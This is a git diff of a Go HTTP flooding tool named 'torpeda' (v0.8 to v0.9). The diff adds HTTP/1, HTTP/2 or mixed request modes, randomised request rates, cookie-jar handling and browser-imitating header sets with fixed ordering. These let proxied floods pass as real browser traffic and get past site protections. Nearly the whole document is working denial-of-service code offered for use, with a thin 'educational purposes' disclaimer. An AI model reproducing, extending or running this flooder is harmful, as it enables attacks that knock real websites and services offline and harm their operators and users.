@@ -46,36 +46,6 @@ var (
 	}
 )
 
-var supportedVersions = []uint16{
-	0xfafa,
-	tls.VersionTLS13,
-	tls.VersionTLS12,
-}
-var cipherSuites = []uint16{
-	0xCACA,
-	tls.TLS_AES_128_GCM_SHA256,
-	tls.TLS_AES_256_GCM_SHA384,
-	tls.TLS_CHACHA20_POLY1305_SHA256,
-	tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
-	tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-	tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
-	tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-	tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
-	tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
-	tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
-	tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
-	tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
-	tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
-	tls.TLS_RSA_WITH_AES_128_CBC_SHA,
-	tls.TLS_RSA_WITH_AES_256_CBC_SHA,
-}
-
-var supportedGroups = []tls.CurveID{
-	tls.X25519,
-	tls.CurveP256,
-	tls.CurveP384,
-}
-
 var (
 	reqmethod string
 	target    string
@@ -91,15 +61,17 @@ var (
 	redirect bool
 	parsed   bool
 	cf       bool
-	usehttp1 bool
 	useJar	 bool
-	useDelay  bool
+	useDelay bool
+	randRate bool
+	useHTTP2 bool
 
 	cookies         = ""
 	timeoutCount    int
 	refererURL      string
 	customCookie    string
 	customUserAgent string
+	httpMode	    string
 
 	connectionFlow   = uint32(15663105)
 	statusMutex      sync.Mutex
@@ -191,7 +163,7 @@ func main() {
 	validMethods := []string{"GET", "POST", "HEAD", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"}
 	if len(os.Args) < 7 {
 		fmt.Print("\033[H\033[2J")
-		fmt.Println(`	[flooder - golang] torpeda v0.8 // Updated: 17.11.2024 // Made with love :D
+		fmt.Println(`	[flooder - golang] torpeda v0.9 // Updated: 17.11.2024 // Made with love :D
 	Developers to method: @rapidreset aka mitigations / helped @benshii
 	WARNING: The method was done for educational purposes, all responsibility is on you!
 	Annoucement: @devtorpeda / @rapidreset
@@ -285,12 +257,16 @@ func main() {
 			if i+1 < len(os.Args) {
 				customCookie = os.Args[i+1]
 			}
-		case "--http1":
-			usehttp1 = true
 		case "--multipath":
 			if i+1 < len(os.Args) {
 				paths = strings.Split(os.Args[i+1], "@")
 			}
+		case "--http":
+			if i+1 < len(os.Args) {
+				httpMode = os.Args[i+1]
+			}
+		case "--randrate":
+			randRate = true
 		case "--delay":
 			useDelay = true
 		case "--jar":
@@ -322,6 +298,7 @@ func main() {
 
 	time.Sleep(time.Duration(duration) * time.Second)
 }
+
 
 func detectProxyType(proxy string) string {
 	if strings.HasPrefix(proxy, "socks5://") {
@@ -423,7 +400,46 @@ func parseCookies(resp *http.Response) {
 
 func randomHeader(proxy string) http.Header {
 	header := http.Header{}
-
+	parsedURL, err := url.Parse(target)
+	if err != nil {
+		os.Exit(1)
+	}
+	domain := parsedURL.Host
+	if httpMode == "1" {
+        header = http.Header{
+      	    "Host":                   	 []string{domain},
+            "Connection":                []string{"keep-alive"},
+            "Cache-Control":             []string{"max-age=0"},
+            "sec-ch-ua":                 []string{`"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"`},
+            "sec-ch-ua-mobile":          []string{"?0"},
+            "sec-ch-ua-platform":        []string{`"Windows"`},
+            "Upgrade-Insecure-Requests": []string{"1"},
+			"User-Agent":                []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"},
+            "Accept":                    []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"},
+            "Sec-Fetch-Mode":            []string{"navigate"},
+            "Sec-Fetch-User":            []string{"?1"},
+            "Sec-Fetch-Dest":            []string{"document"},
+            "Accept-Language":           []string{"en-US,en;q=0.7"},
+            "Accept-Encoding":           []string{"gzip, deflate, br, zstd"},
+        }
+        header[http.HeaderOrderKey] = []string{
+            "host",
+            "connection",
+            "cache-control",
+            "sec-ch-ua",
+            "sec-ch-ua-mobile",
+            "sec-ch-ua-platform",
+            "upgrade-insecure-requests",
+			"user-agent",
+            "accept",
+			"sec-fetch-site",
+            "sec-fetch-mode",
+            "sec-fetch-user",
+            "sec-fetch-dest",
+            "accept-encoding",
+            "accept-language",
+        }
+    } else {
 	browsers := []string{"winEdge", "winBrave", "winArc", "winOperaGX", "winYandex", "linuxBrave", "linuxOpera", "linuxBrave1", "macOpera", "macBrave", "macEdge"}
 	rand.Seed(time.Now().UnixNano())
 	browser := browsers[rand.Intn(len(browsers))]
@@ -434,7 +450,7 @@ func randomHeader(proxy string) http.Header {
 			"cache-control":           []string{"max-age=0"},
 			"sec-ch-ua":               []string{`"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"`},
 			"sec-ch-ua-mobile":        []string{"?0"},
-			"sec-ch-ua-platform":      []string{`Macos"`},
+			"sec-ch-ua-platform":      []string{`"Macos"`},
 			"upgrade-insecure-requests": []string{"1"},
 			"user-agent":              []string{"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"},
 			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"},
@@ -468,7 +484,7 @@ func randomHeader(proxy string) http.Header {
 			"cache-control":           []string{"max-age=0"},
 			"sec-ch-ua":               []string{`"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"`},
 			"sec-ch-ua-mobile":        []string{"?0"},
-			"sec-ch-ua-platform":      []string{`"macOS\\"`},
+			"sec-ch-ua-platform":      []string{`"macOS"`},
 			"upgrade-insecure-requests": []string{"1"},
 			"user-agent":              []string{"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"},
 			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
@@ -796,7 +812,7 @@ func randomHeader(proxy string) http.Header {
 			"priority",
 		}
 	}
-	
+}
 	if refererURL == "rand" {
 		rand.Seed(time.Now().UnixNano())
 		header.Set("referer", randomReferers[rand.Intn(len(randomReferers))])
@@ -866,22 +882,6 @@ func processCustomCookie(cookie string) string {
 	return strings.ReplaceAll(cookie, "%RAND%", randstr(10))
 }
 
-func ResponseBody(resp *http.Response) {
-	const maxSize = 128
-	limitedReader := io.LimitReader(resp.Body, maxSize)
-
-	if _, err := io.Copy(ioutil.Discard, limitedReader); err != nil {
-		return
-	}
-
-	bodyBytes, err := io.ReadAll(resp.Body)
-	if err != nil {
-		return
-	}
-	pageContent := string(bodyBytes)
-	fmt.Println(pageContent)
-}
-
 func getCurrentPath() string {
 	index := atomic.AddInt32(&currentPathIndex, 1) - 1
 	return paths[index%int32(len(paths))]
@@ -901,24 +901,37 @@ func start(proxy string) {
 	parsedURL, err := url.Parse(target)
 	if err != nil {
 		fmt.Println("Error parsing target URL:", err)
-		os.Exit(1)
+		return
 	}
 
-	tlsConfig := &tls.Config{
-		ServerName:               parsedURL.Host,
-		MinVersion:               supportedVersions[len(supportedVersions)-1],
-		MaxVersion:               supportedVersions[0],
-		CurvePreferences:         supportedGroups,
-		CipherSuites:             cipherSuites,
-		ClientSessionCache:       tls.NewLRUClientSessionCache(0),
-		PreferServerCipherSuites: true,
-		InsecureSkipVerify:       true,
+    if httpMode == "1" {
+		useHTTP2 = false
+	} else if httpMode == "2" {
+		useHTTP2 = true
+	} else if httpMode == "mix" {
+		rand.Seed(time.Now().UnixNano())
+		useHTTP2 = rand.Intn(2) == 0
 	}
-	if usehttp1 {
-		tlsConfig.NextProtos = []string{"http/1.1"}
+	
+    tlsConfig := &tls.Config{
+        ServerName:               parsedURL.Host,
+        ClientSessionCache:       tls.NewLRUClientSessionCache(128),
+        PreferServerCipherSuites: true,
+        InsecureSkipVerify:       true,
+    }
+
+	if useHTTP2 {
+		tlsConfig.NextProtos = []string{"h2"}
 	} else {
-		tlsConfig.NextProtos = []string{"h2", "http/1.1"}
+		tlsConfig.NextProtos = []string{"http/1.1"}
 	}
+
+	conn, err := tls.Dial("tcp", parsedURL.Host+":443", tlsConfig)
+	if err != nil {
+		// fmt.Println("Error creating TLS connection:", err)
+		return
+	}
+	defer conn.Close()
 
 	var transport *http.Transport
 	if proxyType == "socks5" || proxyType == "socks4" {
@@ -939,7 +952,7 @@ func start(proxy string) {
 		}
 	}
 
-	if !usehttp1 {
+	if httpMode != "1" {
 		transport_http2, err := http2.ConfigureTransports(transport)
 		if err != nil {
 			return
@@ -958,7 +971,7 @@ func start(proxy string) {
 	if useJar {
 		jar, err = cookiejar.New(nil)
 		if err != nil {
-			fmt.Printf("failed to create cookie jar: %v\n", err)
+			// fmt.Printf("failed to create cookie jar: %v\n", err)
 			return
 		}
 	}
@@ -966,10 +979,6 @@ func start(proxy string) {
 	client := &http.Client{
 		Timeout:   time.Second * 10,
 		Transport: transport,
-	}
-
-	if useJar {
-		client.Jar = jar
 	}
 
 	if redirect {
@@ -1016,28 +1025,43 @@ func start(proxy string) {
 
 	if parsed {
 		parseCookies(resp)
+		if jar != nil {
+			u, err := url.Parse(target)
+			if err == nil {
+				jar.SetCookies(u, resp.Cookies())
+			}
+		}
 	}
 
+
 	if test {
-		ResponseBody(resp)
+		body, _ := io.ReadAll(resp.Body)
+		fmt.Printf(": %s\n", string(body))
 	}
 	
 	atomic.AddInt32(&connections, 1)
 
-	rateLimit := time.NewTicker(time.Second / time.Duration(rps))
-	defer rateLimit.Stop()
-
 	for {
-		select {
-		case <-rateLimit.C:
-			delayrandom()
-			resp, err := client.Do(req)
-			if err != nil {
-				updateErrorCounters(err)
-				continue
-			}
-			resp.Body.Close()
-			updateStatusMap(resp.StatusCode)
+        // Если randRate активирован, рандомизируем rps
+        currentRPS := rps
+        if randRate {
+            rand.Seed(time.Now().UnixNano())
+            currentRPS = float64(rand.Intn(60) + 1) // Генерация rps от 1 до 60
+        }
+
+        rateLimit := time.NewTicker(time.Second / time.Duration(currentRPS))
+        defer rateLimit.Stop()
+
+        select {
+        case <-rateLimit.C:
+            delayrandom()
+            resp, err := client.Do(req)
+            if err != nil {
+                updateErrorCounters(err)
+                continue
+            }
+            resp.Body.Close()
+            updateStatusMap(resp.StatusCode)
 		}
 	}
 	time.Sleep(time.Second)
@@ -1103,7 +1127,7 @@ func printStatuses() {
 ⠀⠜⢠⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣦⠄⣠⠀
 ⠠⢸⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿
 ⠀⠛⣿⣿⣿⡿⠏⠀⠀⠀⠀⠀⠀⢳⣾⣿⣿⣿⣿⣿⣿⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿`)
-		fmt.Println("> Version: v0.8")
+		fmt.Println("> Version: v0.9")
 		fmt.Println("> Request Method:", reqmethod)
 		fmt.Println("> Target:", target)
 		fmt.Println("> Time:", duration)
